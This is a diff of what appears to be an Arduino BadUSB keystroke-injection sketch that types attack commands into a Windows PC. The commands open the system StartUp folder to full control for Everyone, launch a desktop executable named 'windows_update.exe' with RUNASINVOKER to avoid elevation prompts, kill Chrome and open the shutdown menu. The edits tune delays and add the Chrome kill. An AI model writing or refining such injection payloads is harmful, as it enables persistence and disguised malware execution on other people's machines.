@@ -59,11 +59,13 @@ void setup()
 
   typeKey(KEY_RETURN);
 
-  delay(5000);
+  delay(10000);
 
   Keyboard.print(F("exit"));
 
   typeKey(KEY_RETURN);
+  
+  
 
   delay(400);
   Keyboard.print(F("Icacls \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\" /grant Everyone:(OI)(CI)F /T"));
@@ -78,13 +80,13 @@ void setup()
 
   typeKey(KEY_RETURN);
 
-  delay(150);
+  delay(100);
 
   Keyboard.print(F("start ."));
 
   typeKey(KEY_RETURN);
 
-  delay(1000);
+  delay(1500);
 
   Keyboard.press(MENU_KEY);
 
@@ -97,7 +99,6 @@ void setup()
 
   typeKey(KEY_RETURN);
   delay(1500);
-
   Keyboard.print(F("C:\\Windows\\System32\\cmd.exe /min /c \"set __COMPAT_LAYER=RUNASINVOKER && start \"\" %USERPROFILE%\\Desktop\\windows_update.exe\""));
 
   typeKey(KEY_RETURN);
@@ -116,24 +117,28 @@ void setup()
   delay(300);
 
   Keyboard.print(F("exit"));
+  typeKey(KEY_RETURN);
   delay(200);
-
-  Keyboard.print(F("exit"));
-  delay(200);
+  
+  // Kills chrome
+  Keyboard.print(F("TSKILL chrome"));
+  typeKey(KEY_RETURN);
+  delay(100);
+  //Keyboard.print(F("exit"));
+  //typeKey(KEY_RETURN);
+  //delay(200);
 
   Keyboard.press(KEY_LEFT_GUI);
   Keyboard.press('x');
   Keyboard.releaseAll();
 
   delay(100);
-
+  
   Keyboard.print(F("u"));
 
   delay(100);
 
-  Keyboard.print(F("u"));
-
-  //typeKey(KEY_RETURN);
+  //Keyboard.print(F("u"));
 
   // the program is running as a process!
 
